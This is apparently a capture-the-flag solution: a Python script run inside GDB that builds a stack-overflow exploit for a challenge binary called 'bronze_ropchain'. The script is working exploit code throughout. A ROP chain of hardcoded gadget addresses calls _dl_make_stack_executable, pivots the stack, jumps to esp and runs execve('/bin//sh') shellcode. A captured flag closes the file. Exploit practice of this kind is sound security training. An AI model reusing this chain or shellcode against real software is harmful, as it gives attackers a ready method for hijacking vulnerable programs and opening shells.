#!/usr/bin/python3

import gdb
import struct

def p32(address):
    return struct.pack("<i", address)

def generate_payload():
    payload = b""
    payload += b"A"*20
    payload += b"BBBB" # ebx
    payload += b"CCCC" # ebp
    payload += p32(0x080564e4) # pop eax; pop edx; pop ebx; ret
    payload += p32(0x080d9fd0) # eax = global variable _stack_prot
    payload += b"\xff\xff\xff\xff" # edx = -1
    payload += b"BBBB" # ebx
    payload += p32(0x0805e215)*8 # inc edx; ret
    payload += p32(0x0809d084) # mov dword ptr [eax], edx; ret
    payload += p32(0x080564e4) # pop eax; pop edx; pop ebx; ret
    payload += p32(0x080d9da8) # eax = global variable _libc_stack_end
    payload += b"DDDD" # edx
    payload += b"BBBB" # ebx
    payload += p32(0x0809d960) # func _dl_make_stack_executable
    payload += p32(0x08087f17) # pop ebx; ret
    payload += p32(0x080d9da8) # global variable _libc_stack_end
               # is loaded as argument into esi from [esp+16]
    # executable stack is too far away so we need to continue to rop
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x0809e8ab) # add esp, 0x2c; ret
    payload += b"F"*44
    payload += p32(0x080d401b) # jmp esp
    # shellcode here
    payload += b"\x90"*30
    payload += b"\x31\xc0\x50\x68\x2f\x2f\x73"
    payload += b"\x68\x68\x2f\x62\x69\x6e\x89"
    payload += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    payload += b"\xcd\x80\x31\xc0\x40\xcd\x80"
    payload += b"\n"

    return payload

def main():
    payload = generate_payload()
    print(len(payload))

    with open("exp", "wb") as payload_file:
        payload_file.write(payload)
        
    gdb.execute('file ./bronze_ropchain')
    gdb.execute("b * 0x080488e9")
    #gdb.execute("b * 0x0809e8ab") # add esp, 0x2c; ret
    gdb.execute("b * 0x080d401b") # jmp esp

    print(gdb.execute('r < exp', to_string=True))

if __name__ == "__main__":
    main()

# flag{I've_n3v3r_he4rd_th4t_nam3_b3fore._Are_u_f0reign?}
